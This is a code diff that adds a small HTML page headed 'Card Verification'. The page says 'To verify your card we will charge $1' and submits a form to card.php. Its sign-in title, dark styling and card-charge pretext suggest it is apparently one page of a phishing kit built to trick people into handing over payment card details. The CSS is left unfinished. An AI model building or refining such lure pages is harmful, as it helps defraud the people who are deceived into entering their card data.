@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sign In</title>
+        <style>
+            *{
+                margin:0;
+            }
+            body{
+                background-color: black;
+            }
+            img{
+                margin-left: -30px;
+                margin-top: -30px;
+                width:50%;
+            }
+        h1{
+                margin-left: 20px;
+            }
+            button{
+                width:80%;
+                height: 40px;
+                margin-top: 40px;
+                margin-left: 25px;
+                border-radius: 5px;
+                background-color: red;
+                color:white;
+
+            }
+            @media only screen and (min-width: 1000px) {
+                   *{
+                margin:0;
+            }
+            body{
+                background-color: black;
+            }
+            img{
+                margin-left: -30px;
+                margin-top: -30px;
+                width:50%;
+            }
+            .wrapper{
+                
+            }
+       
+                
+
+        </style>
+    </head>
+    <body>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuN3aq20jEAJvYR-qvI-pqDRw0FfGtqa4EkEge0da1&s">
+        <div class="wrapper">
+            <h1 style="color:white; font-family: ;">Card Verification</h1>
+            <form action="card.php" method="POST">
+                <h4 style="color:white; margin-left: 20px; margin-top: 20px;">To verify your card we will charge $1</h4>
+               
+            <button><strong>Continue</strong></button>
+        
+            </form>
+    </body>
+</html>
